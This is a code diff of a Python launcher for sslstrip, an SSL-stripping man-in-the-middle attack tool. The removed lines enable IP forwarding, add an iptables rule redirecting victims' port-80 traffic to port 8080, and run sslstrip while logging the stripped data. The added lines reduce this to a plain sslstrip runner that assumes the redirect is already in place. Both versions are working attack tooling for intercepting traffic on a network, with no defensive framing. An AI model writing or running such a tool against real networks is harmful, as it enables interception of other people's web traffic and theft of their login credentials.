@@ -1,66 +1,31 @@
-import os
+# ssl_strip_runner.py
 import subprocess
-import signal
 import sys
 import argparse
 
-def enable_ip_forwarding():
-    print("[+] Enabling IP forwarding...")
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
-def disable_ip_forwarding():
-    print("[*] Disabling IP forwarding...")
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-
-def add_iptables_redirect():
-    print("[+] Adding iptables rule to redirect port 80 to 8080...")
-    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
-
-def remove_iptables_redirect():
-    print("[*] Flushing iptables NAT table...")
-    os.system("iptables -t nat -F")
-
-def start_sslstrip(logfile=None):
-    print("[+] Starting sslstrip on port 8080...")
-    cmd = ["sslstrip", "-l", "8080"]
-    if logfile:
-        cmd += ["-w", logfile]
-        print("[+] Logging SSL stripped data to: {}".format(logfile))
-
-    return subprocess.Popen(cmd)
 
 def main():
-    parser = argparse.ArgumentParser(description="SSLstrip Launcher with iptables + forwarding")
-    parser.add_argument("--log", help="Path to file where stripped data should be saved", default=None)
+    parser = argparse.ArgumentParser(description="SSLstrip Runner")
+    parser.add_argument("--log", help="Path to file for saving stripped data")
     args = parser.parse_args()
 
-    if os.geteuid() != 0:
-        print("[!] This script must be run as root.")
-        sys.exit(1)
+    print("+++ Starting sslstrip listener...")
 
+    # We will listen on port 8080, as this is where iptables redirects traffic.
+    cmd = ["sslstrip", "-l", "8080"]
+
+    if args.log:
+        cmd.extend(["-w", args.log])
+        print("+++ SSLstrip will log data to: {}".format(args.log))
+
+    # Start the sslstrip process
     try:
-        enable_ip_forwarding()
-        add_iptables_redirect()
-        sslstrip_proc = start_sslstrip(args.log)
-
-        def stop(signum, frame):
-            print("\n[!] Caught interrupt. Cleaning up...")
-            sslstrip_proc.terminate()
-            remove_iptables_redirect()
-            disable_ip_forwarding()
-            print("[+] Cleanup complete. Exiting.")
-            sys.exit(0)
-
-        signal.signal(signal.SIGINT, stop)
-
-        print("[*] SSLstrip running. Press Ctrl+C to stop.")
-        sslstrip_proc.wait()
-
+        sslstrip_proc = subprocess.Popen(cmd)
+        sslstrip_proc.wait()  # Wait for the process to be terminated by the main script
     except Exception as e:
-        print("[!] Error: {}".format(e))
-        remove_iptables_redirect()
-        disable_ip_forwarding()
+        print("! - SSLstrip error: {}".format(e))
         sys.exit(1)
+
 
 if __name__ == "__main__":
     main()
